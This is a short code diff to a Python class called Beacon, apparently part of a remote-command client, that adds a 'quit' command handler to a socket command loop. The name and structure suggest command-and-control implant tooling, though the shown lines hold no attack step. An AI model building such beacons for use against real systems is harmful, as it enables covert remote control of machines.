@@ -44,6 +44,8 @@ class Beacon:
                      error_msg = f"ERROR: {str(e)}"
                      print(error_msg)
                      self.sock.send(error_msg.encode())
+               elif split[0] == "quit":
+                  self.terminate()
                else:
                   self.sock.send("Unknown Error".encode())
             except socket.timeout:
